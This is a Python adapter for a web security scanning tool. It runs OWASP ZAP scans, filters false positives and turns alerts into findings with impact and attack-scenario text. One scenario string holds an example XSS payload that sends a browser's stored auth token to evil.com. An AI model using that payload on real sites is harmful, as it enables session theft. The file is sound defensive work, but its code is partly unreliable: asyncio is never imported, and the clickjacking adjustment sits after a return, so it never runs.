"""ZAP adapter for web application scanning."""

from __future__ import annotations

import logging
import time
from pathlib import Path
from typing import Any
from urllib.parse import urlparse

from packages.adapters.base import AdapterResult, BaseAdapter
from packages.core.models import (
    Evidence,
    Finding,
    FindingCategory,
    FindingConfidence,
    FindingSeverity,
    ScanType,
)
from packages.core.scoring import map_tool_severity

logger = logging.getLogger(__name__)

# Alerts that are noisy/false-positives and should be suppressed or downgraded
FALSE_POSITIVE_ALERTS = {
    # Unix timestamps are not sensitive
    "timestamp disclosure - unix": None,  # None = remove entirely
    # Cache retrieved = purely informational, not a vulnerability
    "retrieved from cache": None,
    # Generic "suspicious" SQL-word comments in source that are not injections
    "suspicious comments": None,
}

# Cache-control only relevant if page handles authenticated/sensitive data
CACHE_CONTROL_ALERT = "re-examine cache-control directives"

# Clickjacking – only flag if there is actual content risk
CLICKJACKING_ALERTS = {
    "x-frame-options header not set",
    "csp: wildcard directive",
    "content security policy (csp) header not set",
}

# Sensitive page indicators – if any match, clickjacking risk is real
SENSITIVE_PAGE_INDICATORS = [
    "login", "signin", "auth", "account", "profile", "password",
    "checkout", "payment", "admin", "dashboard", "settings",
]

# ZAP risk levels mapping
ZAP_RISK_MAP = {
    "0": FindingSeverity.INFO,
    "1": FindingSeverity.LOW,
    "2": FindingSeverity.MEDIUM,
    "3": FindingSeverity.HIGH,
}

# ZAP confidence levels mapping
ZAP_CONFIDENCE_MAP = {
    "0": FindingConfidence.LOW,  # False Positive
    "1": FindingConfidence.LOW,
    "2": FindingConfidence.MEDIUM,
    "3": FindingConfidence.HIGH,
    "4": FindingConfidence.HIGH,  # User Confirmed
}

# High-risk alert types that should be escalated
HIGH_RISK_ALERTS = [
    "sql injection",
    "cross site scripting",
    "xss",
    "remote code execution",
    "command injection",
    "path traversal",
    "server side request forgery",
    "ssrf",
    "xml external entity",
    "xxe",
    "insecure direct object",
    "authentication bypass",
    "session fixation",
    "open redirect",
]


class ZapAdapter(BaseAdapter):
    """Adapter for OWASP ZAP web scanner."""

    name = "zap"
    tool_name = "zap-baseline"
    scan_types = [ScanType.WEB]
    required_binaries = ["zap-baseline.py"]  # From ZAP Docker or local install

    def __init__(self, config: dict[str, Any] | None = None):
        super().__init__(config)
        # Alternative: use zap-cli or zap.sh
        self.zap_command = config.get("zap_command", "zap-baseline.py") if config else "zap-baseline.py"

    def is_available(self) -> bool:
        """Check if ZAP is available."""
        import shutil

        # Check multiple possible ZAP commands
        possible_commands = [
            "zap-baseline.py",
            "zap.sh",
            "zap-cli",
            "/zap/zap-baseline.py",  # Docker path
            "/Applications/ZAP.app/Contents/MacOS/ZAP.sh",  # macOS app path
            "/Applications/ZAP.app/Contents/Java/zap.sh",  # macOS legacy path
        ]

        for cmd in possible_commands:
            if shutil.which(cmd) or Path(cmd).is_file():
                self.zap_command = cmd
                return True

        return False

    async def get_version(self) -> str | None:
        """Get ZAP version."""
        if not self.zap_command:
            return None

        # Method 1: Try to parse from jar file in the same directory (Fastest/Safest)
        try:
            zap_path = Path(self.zap_command)
            if zap_path.is_symlink():
                zap_path = zap_path.resolve()
            
            zap_dir = zap_path.parent
            
            # Look for zap-x.y.z.jar
            for file in zap_dir.glob("zap-*.jar"):
                # matches zap-2.14.0.jar
                name = file.stem # zap-2.14.0
                if name.startswith("zap-") and name[4].isdigit():
                    return name[4:] # 2.14.0
                    
        except Exception as e:
            logger.debug(f"Could not parse ZAP jar version: {e}")

        # Method 2: Fallback to running command
        # ZAP uses -version, not --version
        cmd = [self.zap_command, "-cmd", "-version"] 
        # Added -cmd because sometimes it needs to be told it's command line mode
        
        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await proc.communicate()
            output = stdout.decode().strip()
            
            for line in output.split("\n"):
                if "OWASP ZAP" in line or "ZAP" in line:
                    return line.strip()
            
            return output.split("\n")[0] if output else None
            
        except Exception as e:
            logger.debug(f"Could not get ZAP version: {e}")
            return None

    async def scan(self, target_path: Path, **kwargs: Any) -> AdapterResult:
        """
        Run ZAP baseline scan on the target URL.

        Note: For ZAP, target_path is expected to be a URL string.
        """
        if not self.is_available():
            return AdapterResult(
                success=False,
                error_message="ZAP is not installed. Install OWASP ZAP or use the Docker image.",
            )

        start_time = time.time()

        # Target should be a URL
        target_url = kwargs.get("url", str(target_path))

        # Validate URL
        try:
            parsed = urlparse(target_url)
            if not parsed.scheme or not parsed.netloc:
                return AdapterResult(
                    success=False,
                    error_message=f"Invalid URL: {target_url}",
                )
        except Exception as e:
            return AdapterResult(
                success=False,
                error_message=f"URL parsing failed: {e}",
            )

        # Build command
        import tempfile

        with tempfile.NamedTemporaryFile(suffix=".json", delete=False) as tmp:
            report_path = tmp.name

        # Detect if this is zap.sh (full ZAP) or zap-baseline.py
        is_zap_sh = self.zap_command.endswith(".sh") or "ZAP.sh" in self.zap_command

        if is_zap_sh:
            # zap.sh headless mode: run active scan and generate JSON report
            cmd = [
                self.zap_command,
                "-cmd",
                "-quickurl", target_url,
                "-quickout", report_path,
                "-quickprogress",
            ]
        else:
            # zap-baseline.py style
            cmd = [
                self.zap_command,
                "-t", target_url,
                "-J", report_path,
            ]

            # Add custom rules file if specified
            rules_file = self.config.get("rules_file")
            if rules_file:
                cmd.extend(["-c", rules_file])

            # Add authentication if specified
            if self.config.get("auth_loginurl"):
                cmd.extend(["-l", self.config["auth_loginurl"]])
            if self.config.get("auth_username"):
                cmd.extend(["-u", self.config["auth_username"]])
            if self.config.get("auth_password"):
                cmd.extend(["-p", self.config["auth_password"]])

            # Add ajax spider for JS-heavy sites
            if self.config.get("ajax_spider", False):
                cmd.append("-j")

            # Minutes to spider
            minutes = self.config.get("minutes", 1)
            cmd.extend(["-m", str(minutes)])

        try:
            return_code, stdout, stderr = await self.run_command(
                cmd,
                cwd=None,
                timeout=kwargs.get("timeout", 900),  # 15 min default for web scans
                capture_json=False,
            )

            duration = time.time() - start_time
            version = await self.get_version()

            # Read the JSON report
            import json

            try:
                with open(report_path) as f:
                    raw_output = json.load(f)
            except Exception as e:
                logger.warning(f"Could not read ZAP report: {e}")
                raw_output = {}

            # Clean up temp file
            try:
                Path(report_path).unlink()
            except Exception:
                pass

            # ZAP returns 0 for pass, 1 for warnings, 2 for errors, 3 for fail
            if return_code > 2:
                return AdapterResult(
                    success=False,
                    error_message=f"ZAP scan failed with code {return_code}: {stderr}",
                    duration_seconds=duration,
                    tool_version=version,
                )

            findings = self.parse_output(raw_output)

            return AdapterResult(
                success=True,
                findings=findings,
                raw_output=raw_output,
                duration_seconds=duration,
                tool_version=version,
            )

        except TimeoutError as e:
            return AdapterResult(success=False, error_message=str(e))
        except Exception as e:
            logger.exception(f"ZAP scan failed: {e}")
            return AdapterResult(success=False, error_message=str(e))

    def parse_output(self, raw_output: dict[str, Any]) -> list[Finding]:
        """Parse ZAP JSON output into findings."""
        findings = []
        target_url = ""

        site = raw_output.get("site", [])
        if isinstance(site, list):
            for s in site:
                target_url = s.get("@name", "")
                alerts = s.get("alerts", [])
                for alert in alerts:
                    try:
                        finding = self._parse_alert(alert, target_url)
                        if finding:
                            finding.fingerprint = self.generate_fingerprint(finding)
                            findings.append(finding)
                    except Exception as e:
                        logger.warning(f"Failed to parse ZAP alert: {e}")
        elif isinstance(site, dict):
            target_url = site.get("@name", "")
            alerts = site.get("alerts", [])
            for alert in alerts:
                try:
                    finding = self._parse_alert(alert, target_url)
                    if finding:
                        finding.fingerprint = self.generate_fingerprint(finding)
                        findings.append(finding)
                except Exception as e:
                    logger.warning(f"Failed to parse ZAP alert: {e}")

        # Add auth/storage checks based on the target URL
        auth_findings = self._check_auth_storage(target_url, raw_output)
        findings.extend(auth_findings)

        return findings

    def _should_suppress(self, alert_name: str, alert: dict[str, Any]) -> bool:
        """Return True if this alert is a known false-positive and should be dropped."""
        name_lower = alert_name.lower()

        # Exact suppression list
        for pattern, action in FALSE_POSITIVE_ALERTS.items():
            if pattern in name_lower:
                return True

        # Cache-control: only flag if it's related to authenticated/sensitive resources
        if CACHE_CONTROL_ALERT in name_lower:
            instances = alert.get("instances", [])
            for inst in instances:
                uri = inst.get("uri", "").lower()
                if any(s in uri for s in SENSITIVE_PAGE_INDICATORS):
                    return False  # Keep – sensitive page
            return True  # Suppress – not sensitive

        return False

    def _adjust_clickjacking(self, alert_name: str, finding: Finding, target_url: str) -> Finding | None:
        """Downgrade or suppress clickjacking alerts if page is not sensitive."""
        name_lower = alert_name.lower()
        if not any(cj in name_lower for cj in CLICKJACKING_ALERTS):
            return finding  # Not a clickjacking alert

        url_lower = target_url.lower()
        if any(s in url_lower for s in SENSITIVE_PAGE_INDICATORS):
            # Real risk – keep as MEDIUM
            finding.severity = FindingSeverity.MEDIUM
            finding.description += (
                "\n\nNote: This page appears to handle sensitive data (auth/account/payment), "
                "making clickjacking a real risk."
            )
            return finding

        # Not a sensitive page – downgrade to LOW
        finding.severity = FindingSeverity.LOW
        finding.confidence = FindingConfidence.LOW
        finding.description += (
            "\n\nNote: Downgraded to LOW – page does not appear to handle sensitive data. "
            "Clickjacking is only a real risk on login, payment, or account pages."
        )
        return finding

    def _check_auth_storage(self, target_url: str, raw_output: dict[str, Any]) -> list[Finding]:
        """
        Detect insecure auth token storage patterns from ZAP passive scan evidence.
        Looks for localStorage/sessionStorage usage in responses.
        """
        findings = []
        responses = raw_output.get("responses", []) or raw_output.get("messages", [])

        for resp in responses:
            body = resp.get("responseBody", "") or resp.get("body", "")
            url = resp.get("requestHeader", "").split("\n")[0] if "requestHeader" in resp else target_url

            body_lower = body.lower()

            # Check for localStorage/sessionStorage storing tokens
            if any(kw in body_lower for kw in ["localstorage.setitem", "sessionstorage.setitem"]):
                if any(t in body_lower for t in ["token", "auth", "jwt", "access_token", "refresh_token"]):
                    findings.append(Finding(
                        title="Auth Token Stored in Browser Storage",
                        severity=FindingSeverity.MEDIUM,
                        category=FindingCategory.WEB,
                        confidence=FindingConfidence.MEDIUM,
                        description=(
                            "The application stores authentication tokens in localStorage or sessionStorage. "
                            "These are accessible via JavaScript and can be stolen through XSS attacks."
                        ),
                        evidence=Evidence(
                            tool=self.name,
                            file_path=url,
                            snippet="localStorage/sessionStorage token usage detected in response body",
                        ),
                        impact=(
                            "If an XSS vulnerability exists, attackers can steal auth tokens from browser storage "
                            "and take over user sessions."
                        ),
                        attack_scenario=(
                            "1. Attacker finds XSS on any page of the app\n"
                            "2. Injects: <script>fetch('https://evil.com/?t='+localStorage.getItem('token'))</script>\n"
                            "3. Victim's token is exfiltrated\n"
                            "4. Attacker uses token to authenticate as victim"
                        ),
                        recommendation=(
                            "Store auth tokens in HttpOnly cookies instead of localStorage/sessionStorage. "
                            "HttpOnly cookies are not accessible via JavaScript and are immune to XSS token theft."
                        ),
                        references=["https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html"],
                    ))

        return findings

    def _parse_alert(self, alert: dict[str, Any], site_name: str) -> Finding | None:
        """Parse a single ZAP alert into a Finding."""
        alert_name = alert.get("name", "Unknown Alert")

        # Drop known false-positives
        if self._should_suppress(alert_name, alert):
            logger.debug(f"Suppressing false-positive alert: {alert_name}")
            return None

        risk_code = str(alert.get("riskcode", "2"))
        confidence_code = str(alert.get("confidence", "2"))
        description = alert.get("desc", "")
        solution = alert.get("solution", "")
        reference = alert.get("reference", "")
        cwe_id = alert.get("cweid", "")
        wasc_id = alert.get("wascid", "")

        # Get severity
        severity = ZAP_RISK_MAP.get(risk_code, FindingSeverity.MEDIUM)

        # Escalate high-risk alerts
        alert_lower = alert_name.lower()
        if any(pattern in alert_lower for pattern in HIGH_RISK_ALERTS):
            if severity == FindingSeverity.MEDIUM:
                severity = FindingSeverity.HIGH
            elif severity == FindingSeverity.LOW:
                severity = FindingSeverity.MEDIUM

        # Get confidence
        confidence = ZAP_CONFIDENCE_MAP.get(confidence_code, FindingConfidence.MEDIUM)

        # Get affected URLs
        instances = alert.get("instances", [])
        urls = []
        evidence_parts = []
        for instance in instances[:5]:  # Limit instances
            uri = instance.get("uri", "")
            method = instance.get("method", "")
            param = instance.get("param", "")
            evidence = instance.get("evidence", "")

            if uri:
                urls.append(uri)
            if evidence:
                evidence_parts.append(f"{method} {uri}\nParam: {param}\nEvidence: {evidence[:200]}")

        evidence_obj = Evidence(
            tool=self.name,
            file_path=urls[0] if urls else site_name,
            line_start=None,
            line_end=None,
            snippet="\n---\n".join(evidence_parts[:3]) if evidence_parts else None,
            raw_output=alert,
        )

        # Build references
        references = []
        if cwe_id:
            references.append(f"https://cwe.mitre.org/data/definitions/{cwe_id}.html")
        if wasc_id:
            references.append(f"http://projects.webappsec.org/w/page/{wasc_id}")
        if reference:
            # Parse reference HTML/text for URLs
            import re

            urls_in_ref = re.findall(r'https?://[^\s<>"]+', reference)
            references.extend(urls_in_ref[:3])

        # Build impact
        impact = self._get_impact(alert_name, severity)

        # Build attack scenario
        attack_scenario = self._get_attack_scenario(alert_name, instances)

        return Finding(
            title=alert_name,
            severity=severity,
            category=FindingCategory.WEB,
            confidence=confidence,
            description=self._clean_html(description),
            evidence=evidence_obj,
            impact=impact,
            attack_scenario=attack_scenario,
            recommendation=self._clean_html(solution) or "Review and fix according to security best practices.",
            patch=None,  # Web findings don't typically have patches
            references=references,
            cwe_id=f"CWE-{cwe_id}" if cwe_id else None,
        )

        # Apply clickjacking risk adjustment
        finding = self._adjust_clickjacking(alert_name, finding, site_name)

        return finding

    def _clean_html(self, text: str) -> str:
        """Remove HTML tags from text."""
        import re

        clean = re.sub(r"<[^>]+>", "", text)
        clean = clean.replace("&lt;", "<").replace("&gt;", ">").replace("&amp;", "&")
        return clean.strip()

    def _get_impact(self, alert_name: str, severity: FindingSeverity) -> str:
        """Get impact description based on alert type."""
        alert_lower = alert_name.lower()

        if "sql injection" in alert_lower:
            return "SQL injection can allow attackers to read, modify, or delete database data, bypass authentication, or execute commands."
        elif "cross site scripting" in alert_lower or "xss" in alert_lower:
            return "XSS can allow attackers to steal session cookies, capture credentials, or perform actions as the victim."
        elif "csrf" in alert_lower:
            return "CSRF can allow attackers to perform unauthorized actions on behalf of authenticated users."
        elif "clickjacking" in alert_lower or "x-frame-options" in alert_lower:
            return "Clickjacking can trick users into clicking hidden elements, potentially leading to unauthorized actions."
        elif "ssl" in alert_lower or "tls" in alert_lower or "https" in alert_lower:
            return "SSL/TLS issues can allow attackers to intercept or modify traffic between users and the server."
        elif "header" in alert_lower:
            return "Missing or misconfigured security headers can expose the application to various attacks."

        return f"This {severity.value} severity issue could impact the security of the application and its users."

    def _get_attack_scenario(self, alert_name: str, instances: list) -> str:
        """Generate attack scenario based on alert type."""
        alert_lower = alert_name.lower()

        if "sql injection" in alert_lower:
            return (
                "1. Attacker identifies vulnerable parameter\n"
                "2. Attacker crafts SQL injection payload\n"
                "3. Database executes malicious query\n"
                "4. Attacker extracts or modifies data"
            )
        elif "xss" in alert_lower or "cross site scripting" in alert_lower:
            return (
                "1. Attacker injects malicious script\n"
                "2. Victim visits page with injected script\n"
                "3. Script executes in victim's browser\n"
                "4. Attacker steals session or performs actions"
            )
        elif "csrf" in alert_lower:
            return (
                "1. Attacker creates malicious page\n"
                "2. Victim visits attacker's page while logged in\n"
                "3. Hidden request sent to vulnerable site\n"
                "4. Action performed as victim"
            )

        # Generic scenario
        url = instances[0].get("uri", "target URL") if instances else "target URL"
        return f"1. Attacker identifies vulnerable endpoint: {url[:50]}\n2. Attacker exploits the vulnerability\n3. Impact depends on specific vulnerability type"
